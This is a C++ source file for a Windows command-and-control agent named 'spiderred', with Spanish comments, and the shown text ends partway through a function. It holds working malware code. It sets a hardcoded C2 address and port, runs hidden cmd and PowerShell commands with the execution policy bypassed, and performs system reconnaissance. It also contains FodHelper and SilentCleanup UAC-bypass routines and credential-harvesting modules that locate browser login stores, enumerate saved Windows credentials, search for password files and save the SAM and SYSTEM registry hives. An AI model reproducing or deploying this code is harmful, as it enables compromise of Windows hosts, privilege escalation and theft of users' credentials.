// spiderred_complete.cpp - Agente C2 con TODAS las funcionalidades
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <fstream>
#include <sstream>
#include <map>
#include <random>
#include <ctime>
#include <iomanip>
#include <direct.h>
#include <Lmcons.h>
#include <Shlobj.h>
#include <urlmon.h>
#include <wtsapi32.h>
#include <dpapi.h>
#include <lm.h>
#include <wincred.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "crypt32.lib")

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "192.168.254.137"
#define C2_PORT 8443
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define CHECKIN_INTERVAL 60
#define JITTER 30
#define MASTER_KEY "SpiderRedMasterKey2024!@#$%"

// ==================== UTILIDADES ====================
namespace Utils {
    std::string GetCurrentTime() {
        time_t now = time(0);
        char buf[80];
        ctime_s(buf, sizeof(buf), &now);
        std::string str(buf);
        str.erase(std::remove(str.begin(), str.end(), '\n'), str.end());
        return str;
    }

    std::string GetComputerName() {
        char name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(name);
        ::GetComputerNameA(name, &size);
        return std::string(name);
    }

    std::string GetUserName() {
        char name[UNLEN + 1];
        DWORD size = sizeof(name);
        ::GetUserNameA(name, &size);
        return std::string(name);
    }

    std::string GetDomain() {
        char domain[256];
        DWORD size = sizeof(domain);
        if (::GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            return std::string(domain);
        }
        return "WORKGROUP";
    }

    bool IsElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;

        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        bool isElevated = false;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                               sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated != 0;
        }
        
        CloseHandle(hToken);
        return isElevated;
    }

    std::string GetOSVersion() {
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osvi);

        std::stringstream ss;
        ss << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "."
           << osvi.dwBuildNumber;
        if (osvi.wProductType == VER_NT_WORKSTATION) {
            ss << " Workstation";
        } else {
            ss << " Server";
        }
        return ss.str();
    }

    std::string GetArchitecture() {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
            case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
            case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
            default: return "Unknown";
        }
    }

    std::string ExecuteCommand(const std::string& cmd, DWORD timeout = 30000) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));

        std::string fullCmd = "cmd.exe /c " + cmd;
        char* cmdLine = _strdup(fullCmd.c_str());

        std::string output;
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);

            WaitForSingleObject(pi.hProcess, timeout);

            char buffer[4096];
            DWORD bytesRead;
            while (::ReadFile(hStdoutRd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                output.append(buffer, bytesRead);
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        CloseHandle(hStdoutRd);
        free(cmdLine);
        return output;
    }

    std::string ExecutePowerShell(const std::string& script) {
        std::string cmd = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"" + script + "\"";
        return ExecuteCommand(cmd);
    }

    std::vector<std::string> Split(const std::string& s, char delimiter) {
        std::vector<std::string> tokens;
        std::string token;
        std::istringstream tokenStream(s);
        while (std::getline(tokenStream, token, delimiter)) {
            tokens.push_back(token);
        }
        return tokens;
    }

    bool FileExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    bool DirectoryExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    std::string ReadFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return "";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return content;
    }

    bool WriteFile(const std::string& path, const std::string& content) {
        std::ofstream file(path, std::ios::binary);
        if (!file) return false;
        
        file.write(content.c_str(), content.size());
        return true;
    }

    std::string GetTempPath() {
        char path[MAX_PATH];
        ::GetTempPathA(MAX_PATH, path);
        return std::string(path);
    }

    std::string GetAppDataPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        return std::string(path);
    }

    std::string GetDesktopPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
        return std::string(path);
    }

    std::string GetSystemPath() {
        char path[MAX_PATH];
        GetSystemDirectoryA(path, MAX_PATH);
        return std::string(path);
    }

    std::string Base64Encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                            buffer.data(), &len);
        return std::string(buffer.data(), buffer.size() - 1);
    }

    std::string Base64Decode(const std::string& input) {
        DWORD len = 0;
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
        return std::string(reinterpret_cast<char*>(buffer.data()), len);
    }

    std::string XOREncrypt(const std::string& data, const std::string& key) {
        std::string result;
        for (size_t i = 0; i < data.size(); i++) {
            result += data[i] ^ key[i % key.size()];
        }
        return result;
    }

    std::string GetCurrentExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }

    std::string GetRandomString(size_t length) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

        std::string result;
        for (size_t i = 0; i < length; ++i) {
            result += alphanum[dis(gen)];
        }
        return result;
    }

    bool CreateDirectoryRecursive(const std::string& path) {
        size_t pos = 0;
        std::string dir;
        
        while ((pos = path.find_first_of("\\/", pos + 1)) != std::string::npos) {
            dir = path.substr(0, pos);
            if (!DirectoryExists(dir) && dir.find(":") != std::string::npos) {
                CreateDirectoryA(dir.c_str(), NULL);
            }
        }
        
        return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }
}

// ==================== MÓDULO DE RECOLECCIÓN DE INFORMACIÓN ====================
class InfoCollector {
public:
    static std::string CollectAll() {
        std::stringstream ss;
        
        ss << "=== SYSTEM INFORMATION ===\n";
        ss << GetSystemInfo();
        
        ss << "\n=== USER INFORMATION ===\n";
        ss << GetUserInfo();
        
        ss << "\n=== NETWORK INFORMATION ===\n";
        ss << GetNetworkInfo();
        
        ss << "\n=== PROCESS INFORMATION ===\n";
        ss << GetProcessInfo();
        
        ss << "\n=== SERVICE INFORMATION ===\n";
        ss << GetServiceInfo();
        
        ss << "\n=== INSTALLED SOFTWARE ===\n";
        ss << GetInstalledSoftware();
        
        ss << "\n=== DRIVE INFORMATION ===\n";
        ss << GetDriveInfo();
        
        return ss.str();
    }

    static std::string GetSystemInfo() {
        std::stringstream ss;
        
        ss << "Computer Name: " << Utils::GetComputerName() << "\n";
        ss << "OS Version: Windows " << Utils::GetOSVersion() << "\n";
        ss << "Architecture: " << Utils::GetArchitecture() << "\n";
        ss << "Domain: " << Utils::GetDomain() << "\n";
        ss << "Elevated: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
        
        // CPU info
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char cpuName[256];
            DWORD size = sizeof(cpuName);
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL,
                                (LPBYTE)cpuName, &size) == ERROR_SUCCESS) {
                ss << "CPU: " << cpuName << "\n";
            }
            RegCloseKey(hKey);
        }
        
        // RAM info
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(memInfo);
        if (GlobalMemoryStatusEx(&memInfo)) {
            ss << "Total RAM: " << (memInfo.ullTotalPhys / (1024 * 1024 * 1024)) << " GB\n";
        }
        
        return ss.str();
    }

    static std::string GetUserInfo() {
        std::stringstream ss;
        
        ss << "Current User: " << Utils::GetUserName() << "\n";
        
        // Local users
        ss << "\nLocal Users:\n";
        ss << Utils::ExecuteCommand("net user");
        
        // Local groups
        ss << "\nLocal Groups:\n";
        ss << Utils::ExecuteCommand("net localgroup");
        
        // Logged on users
        ss << "\nLogged On Users:\n";
        ss << Utils::ExecuteCommand("query user 2>nul || whoami");
        
        return ss.str();
    }

    static std::string GetNetworkInfo() {
        std::stringstream ss;
        
        ss << "IP Configuration:\n";
        ss << Utils::ExecuteCommand("ipconfig /all");
        
        ss << "\nNetwork Connections:\n";
        ss << Utils::ExecuteCommand("netstat -ano");
        
        ss << "\nARP Cache:\n";
        ss << Utils::ExecuteCommand("arp -a");
        
        ss << "\nRouting Table:\n";
        ss << Utils::ExecuteCommand("route print");
        
        ss << "\nDNS Cache:\n";
        ss << Utils::ExecuteCommand("ipconfig /displaydns | findstr Record");
        
        return ss.str();
    }

    static std::string GetProcessInfo() {
        std::stringstream ss;
        
        ss << "Running Processes:\n";
        ss << Utils::ExecuteCommand("tasklist /v");
        
        ss << "\nProcess Tree:\n";
        ss << Utils::ExecutePowerShell("Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet | Format-Table -AutoSize");
        
        ss << "\nStartup Programs:\n";
        ss << Utils::ExecuteCommand("wmic startup get caption,command");
        
        return ss.str();
    }

    static std::string GetServiceInfo() {
        std::stringstream ss;
        
        ss << "Services:\n";
        ss << Utils::ExecuteCommand("net start");
        
        ss << "\nService Details:\n";
        ss << Utils::ExecutePowerShell(
            "Get-Service | Where-Object {$_.Status -eq 'Running'} | "
            "Select-Object Name, DisplayName, StartType | Format-Table -AutoSize"
        );
        
        ss << "\nDrivers:\n";
        ss << Utils::ExecuteCommand("sc query type= driver state= all");
        
        return ss.str();
    }

    static std::string GetInstalledSoftware() {
        std::stringstream ss;
        
        ss << "Installed Programs (32-bit):\n";
        ss << Utils::ExecuteCommand(
            "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | "
            "findstr /B /C:\"DisplayName\""
        );
        
        ss << "\nInstalled Programs (64-bit):\n";
        ss << Utils::ExecuteCommand(
            "reg query \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | "
            "findstr /B /C:\"DisplayName\""
        );
        
        return ss.str();
    }

    static std::string GetDriveInfo() {
        std::stringstream ss;
        
        ss << "Drive Information:\n";
        ss << Utils::ExecuteCommand("wmic logicaldisk get caption,description,filesystem,freespace,size");
        
        ss << "\nDisk Usage:\n";
        ss << Utils::ExecuteCommand("fsutil fsinfo drives && for %d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do @fsutil fsinfo drivetype %d: 2>nul | findstr /i \"fixed\" >nul && echo %d:");
        
        return ss.str();
    }
};

// ==================== MÓDULO DE PRIVESC ====================
class PrivilegeEscalation {
public:
    static std::string CheckAll() {
        std::stringstream ss;
        
        ss << "=== PRIVILEGE ESCALATION CHECKS ===\n\n";
        
        ss << "[1] Current Privileges:\n";
        ss << CheckCurrentPrivileges();
        
        ss << "\n[2] UAC Status:\n";
        ss << CheckUAC();
        
        ss << "\n[3] Vulnerable Services:\n";
        ss << CheckVulnerableServices();
        
        ss << "\n[4] Scheduled Tasks:\n";
        ss << CheckScheduledTasks();
        
        ss << "\n[5] Weak File Permissions:\n";
        ss << CheckWeakFilePermissions();
        
        ss << "\n[6] AlwaysInstallElevated:\n";
        ss << CheckAlwaysInstallElevated();
        
        ss << "\n[7] Unquoted Service Paths:\n";
        ss << CheckUnquotedServicePaths();
        
        ss << "\n[8] Token Privileges:\n";
        ss << CheckTokenPrivileges();
        
        return ss.str();
    }

    static std::string Exploit() {
        std::stringstream ss;
        
        ss << "=== PRIVILEGE ESCALATION ATTEMPTS ===\n\n";
        
        // Try multiple methods
        ss << "[1] Trying FodHelper UAC bypass...\n";
        std::string result = TryFodHelperBypass();
        ss << result;
        
        if (result.find("success") == std::string::npos) {
            ss << "\n[2] Trying SilentCleanup UAC bypass...\n";
            ss << TrySilentCleanupBypass();
        }
        
        ss << "\n[3] Trying service exploitation...\n";
        ss << TryServiceExploitation();
        
        ss << "\n[4] Trying token manipulation...\n";
        ss << TryTokenManipulation();
        
        return ss.str();
    }

private:
    static std::string CheckCurrentPrivileges() {
        std::stringstream ss;
        
        if (Utils::IsElevated()) {
            ss << "[+] Running with Administrator privileges\n";
        } else {
            ss << "[-] Running with normal user privileges\n";
        }
        
        ss << Utils::ExecuteCommand("whoami /priv");
        
        return ss.str();
    }

    static std::string CheckUAC() {
        HKEY hKey;
        DWORD uacValue = 1;
        DWORD size = sizeof(uacValue);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            if (RegQueryValueExA(hKey, "EnableLUA", NULL, NULL,
                                (LPBYTE)&uacValue, &size) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                if (uacValue == 0) {
                    return "[+] UAC is disabled!\n";
                } else {
                    return "[-] UAC is enabled (Level: " + std::to_string(uacValue) + ")\n";
                }
            }
            RegCloseKey(hKey);
        }
        
        return "[-] Could not determine UAC status\n";
    }

    static std::string CheckVulnerableServices() {
        return Utils::ExecutePowerShell(
            "Get-Service | Where-Object {"
            "  $_.StartType -eq 'Auto' -and $_.Status -eq 'Running' -and "
            "  ($_.StartName -eq 'LocalSystem' -or $_.StartName -like '*\\*')"
            "} | "
            "Select-Object Name, StartName, PathName | "
            "Format-Table -AutoSize"
        );
    }

    static std::string CheckScheduledTasks() {
        return Utils::ExecutePowerShell(
            "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | "
            "Select-Object TaskName, Author, Actions, Principal | "
            "Where-Object {$_.Principal.UserId -eq 'SYSTEM'} | "
            "Format-Table -AutoSize"
        );
    }

    static std::string CheckWeakFilePermissions() {
        return Utils::ExecutePowerShell(
            "$paths = @('C:\\Windows\\System32', 'C:\\Program Files', 'C:\\Program Files (x86)');"
            "foreach ($path in $paths) {"
            "  if (Test-Path $path) {"
            "    Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | "
            "    Where-Object {$_.Name -match '.*\\.(exe|dll|ps1|bat|vbs)$'} | "
            "    ForEach-Object {"
            "      $acl = Get-Acl $_.FullName;"
            "      $access = $acl.Access | "
            "        Where-Object {"
            "          $_.IdentityReference -match 'Everyone|Users|Authenticated Users' -and "
            "          $_.FileSystemRights -match 'FullControl|Write|Modify'"
            "        };"
            "      if ($access) {"
            "        $_.FullName"
            "      }"
            "    }"
            "  }"
            "}"
        );
    }

    static std::string CheckAlwaysInstallElevated() {
        std::stringstream ss;
        
        HKEY hKey;
        DWORD value = 0;
        DWORD size = sizeof(value);
        bool found = false;
        
        // HKLM
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
                ss << "[+] HKLM AlwaysInstallElevated is enabled!\n";
                found = true;
            }
            RegCloseKey(hKey);
        }
        
        // HKCU
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
                ss << "[+] HKCU AlwaysInstallElevated is enabled!\n";
                found = true;
            }
            RegCloseKey(hKey);
        }
        
        if (!found) {
            ss << "[-] AlwaysInstallElevated is not enabled\n";
        }
        
        return ss.str();
    }

    static std::string CheckUnquotedServicePaths() {
        return Utils::ExecutePowerShell(
            "Get-WmiObject -Class Win32_Service | "
            "Where-Object {$_.PathName -notlike '\"*\"' -and $_.PathName -like '* *'} | "
            "Select-Object Name, PathName, StartName | "
            "Format-Table -AutoSize"
        );
    }

    static std::string CheckTokenPrivileges() {
        return Utils::ExecutePowerShell(
            "whoami /priv | findstr /i 'SeBackupPrivilege|SeRestorePrivilege|"
            "SeDebugPrivilege|SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege'"
        );
    }

    static std::string TryFodHelperBypass() {
        try {
            // Create registry entry
            HKEY hKey;
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                               "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                               0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                
                std::string cmd = "cmd.exe /c echo [UAC Bypass Successful] > C:\\Windows\\Temp\\bypass.txt";
                RegSetValueExA(hKey, "", 0, REG_SZ,
                              (const BYTE*)cmd.c_str(), cmd.length() + 1);
                
                RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
                RegCloseKey(hKey);

                // Execute fodhelper
                ShellExecuteA(NULL, "runas", "fodhelper.exe", NULL, NULL, SW_HIDE);
                
                Sleep(3000);
                
                // Cleanup
                RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
                
                if (Utils::FileExists("C:\\Windows\\Temp\\bypass.txt")) {
                    DeleteFileA("C:\\Windows\\Temp\\bypass.txt");
                    return "[+] FodHelper UAC bypass successful!\n";
                }
            }
        } catch (...) {}
        
        return "[-] FodHelper UAC bypass failed\n";
    }

    static std::string TrySilentCleanupBypass() {
        return Utils::ExecutePowerShell(
            "$path = 'HKCU:\\Environment';"
            "$name = 'windir';"
            "$value = 'cmd.exe /c echo [SilentCleanup Bypass] > C:\\Windows\\Temp\\silent.txt && timeout 3 && del /q/f %temp%\\* & start /b cmd.exe';"
            "New-ItemProperty -Path $path -Name $name -Value $value -PropertyType String -Force;"
            "Start-Process -WindowStyle Hidden -FilePath 'schtasks.exe' -ArgumentList '/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I';"
            "Start-Sleep -Seconds 5;"
            "Remove-ItemProperty -Path $path -Name $name -Force;"
            "if (Test-Path 'C:\\Windows\\Temp\\silent.txt') {"
            "  Remove-Item 'C:\\Windows\\Temp\\silent.txt';"
            "  '[+] SilentCleanup bypass attempted'"
            "} else {"
            "  '[-] SilentCleanup bypass failed'"
            "}"
        );
    }

    static std::string TryServiceExploitation() {
        // Look for services with weak permissions
        std::string result = Utils::ExecutePowerShell(
            "Get-WmiObject -Class Win32_Service | "
            "Where-Object {$_.StartName -eq 'LocalSystem'} | "
            "Select-Object -First 5 Name, PathName | "
            "Format-Table -AutoSize"
        );
        
        if (!result.empty()) {
            return "[+] Found services running as SYSTEM:\n" + result;
        }
        
        return "[-] No exploitable services found\n";
    }

    static std::string TryTokenManipulation() {
        // Look for processes with SeImpersonate privilege
        std::string result = Utils::ExecutePowerShell(
            "Get-Process | Where-Object {$_.ProcessName -in @('lsass', 'services', 'winlogon')} | "
            "Select-Object Id, ProcessName, SessionId | "
            "Format-Table -AutoSize"
        );
        
        if (!result.empty()) {
            return "[+] Found privileged processes:\n" + result + 
                   "\n[+] Use tools like PrintSpoofer, JuicyPotato, or RogueWinRM\n";
        }
        
        return "[-] No obvious token manipulation targets\n";
    }
};

// ==================== MÓDULO DE CREDENCIALES ====================
class CredentialHarvester {
public:
    static std::string HarvestAll() {
        std::stringstream ss;
        
        ss << "=== CREDENTIAL HARVESTING ===\n\n";
        
        ss << "[1] Browser Credentials:\n";
        ss << HarvestBrowserCredentials();
        
        ss << "\n[2] Windows Credentials:\n";
        ss << HarvestWindowsCredentials();
        
        ss << "\n[3] Password Files:\n";
        ss << FindPasswordFiles();
        
        ss << "\n[4] Memory Credentials:\n";
        ss << HarvestMemoryCredentials();
        
        ss << "\n[5] Wifi Passwords:\n";
        ss << HarvestWifiPasswords();
        
        ss << "\n[6] Saved RDP Credentials:\n";
        ss << HarvestRDPCredentials();
        
        return ss.str();
    }

    static std::string DumpSAM() {
        if (!Utils::IsElevated()) {
            return "[-] Administrator privileges required for SAM dumping\n";
        }
        
        std::stringstream ss;
        
        ss << "[+] Dumping SAM registry hives...\n";
        
        // Save SAM, SYSTEM, SECURITY
        ss << Utils::ExecuteCommand("reg save hklm\\sam C:\\Windows\\Temp\\sam.save 2>&1");
        ss << Utils::ExecuteCommand("reg save hklm\\system C:\\Windows\\Temp\\system.save 2>&1");
        ss << Utils::ExecuteCommand("reg save hklm\\security C:\\Windows\\Temp\\security.save 2>&1");
        
        // Read and encode
        std::string samData = Utils::ReadFile("C:\\Windows\\Temp\\sam.save");
        std::string systemData = Utils::ReadFile("C:\\Windows\\Temp\\system.save");
        
        if (!samData.empty() && !systemData.empty()) {
            ss << "[+] SAM (" << samData.size() << " bytes) dumped successfully\n";
            ss << "[+] SYSTEM (" << systemData.size() << " bytes) dumped successfully\n";
            
            // Cleanup
            DeleteFileA("C:\\Windows\\Temp\\sam.save");
            DeleteFileA("C:\\Windows\\Temp\\system.save");
            DeleteFileA("C:\\Windows\\Temp\\security.save");
            
            // Also try to get hashes with mimikatz style (simulated)
            ss << "\n[+] Extracting hashes (simulated):\n";
            ss << Utils::ExecuteCommand("reg query \"HKLM\\SAM\\SAM\\Domains\\Account\\Users\" /s 2>nul | findstr /i \"V F\"");
        } else {
            ss << "[-] Failed to dump SAM\n";
        }
        
        return ss.str();
    }

private:
    static std::string HarvestBrowserCredentials() {
        std::stringstream ss;
        
        // Chrome
        std::string chromePath = Utils::GetAppDataPath() + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        if (Utils::FileExists(chromePath)) {
            ss << "[*] Chrome credentials: " << chromePath << "\n";
        }
        
        // Firefox
        std::string firefoxProfiles = Utils::GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles\\";
        if (Utils::DirectoryExists(firefoxProfiles)) {
            ss << "[*] Firefox profiles: " << firefoxProfiles << "\n";
            std::string cmd = "dir \"" + firefoxProfiles + "\" /b";
            ss << Utils::ExecuteCommand(cmd);
        }
        
        // Edge
        std::string edgePath = Utils::GetAppDataPath() + "\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        if (Utils::FileExists(edgePath)) {
            ss << "[*] Edge credentials: " << edgePath << "\n";
        }
        
        // Opera
        std::string operaPath = Utils::GetAppDataPath() + "\\Opera Software\\Opera Stable\\Login Data";
        if (Utils::FileExists(operaPath)) {
            ss << "[*] Opera credentials: " << operaPath << "\n";
        }
        
        if (ss.str().find("[*]") == std::string::npos) {
            ss << "[-] No browser credentials found\n";
        }
        
        return ss.str();
    }

    static std::string HarvestWindowsCredentials() {
        std::stringstream ss;
        
        // Credential Manager
        ss << Utils::ExecuteCommand("cmdkey /list");
        
        // Vault
        ss << "\n[+] Windows Vault:\n";
        ss << Utils::ExecutePowerShell(
            "cmdkey /list | ForEach-Object {"
            "  if ($_ -match 'Target: (.*)') {"
            "    cmdkey /list:$($matches[1])"
            "  }"
            "}"
        );
        
        // Stored passwords in registry
        ss << "\n[+] Stored passwords in registry:\n";
        ss << Utils::ExecuteCommand(
            "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v AutoConfigURL 2>nul"
        );
        
        return ss.str();
    }

    static std::string FindPasswordFiles() {
        std::stringstream ss;
        
        std::vector<std::string> searchDirs = {
            Utils::GetDesktopPath(),
            Utils::GetAppDataPath(),
            "C:\\Users\\" + Utils::GetUserName() + "\\Documents",
            "C:\\Users\\" + Utils::GetUserName() + "\\Downloads",
            "C:\\"
        };
        
        std::vector<std::string> patterns = {
            "pass*.txt", "cred*.txt", "login*.txt", "*.kdbx",
            "*.ps1", "*.bat", "*.vbs", "*.config", "web.config",
            "*.xml", "*.json", "*.ini"
        };
        
        for (const auto& dir : searchDirs) {
            if (Utils::DirectoryExists(dir)) {
                for (const auto& pattern : patterns) {
                    std::string cmd = "dir /s /b \"" + dir + "\\" + pattern + "\" 2>nul | findstr /i pass cred login secret";
                    std::string result = Utils::ExecuteCommand(cmd);
                    if (!result.empty()) {
                        ss << "[*] Found in " << dir << ":\n" << result << "\n";
                    }
                }
            }
        }
        
        if (ss.str().find("[*]") == std::string::npos) {
            ss << "[-] No obvious password files found\n";
        }
        
        return ss.str();
    }

    static std::string HarvestMemoryCredentials() {
        std::stringstream ss;
        
        // Check for LSASS process
        ss << Utils::ExecuteCommand("tasklist | findstr /i lsass");
        
        // Check for other credential processes
        ss << "\n[+] Processes with potential credentials:\n";
        ss << Utils::ExecuteCommand("tasklist | findstr /i \"explorer chrome firefox outlook teams\"");
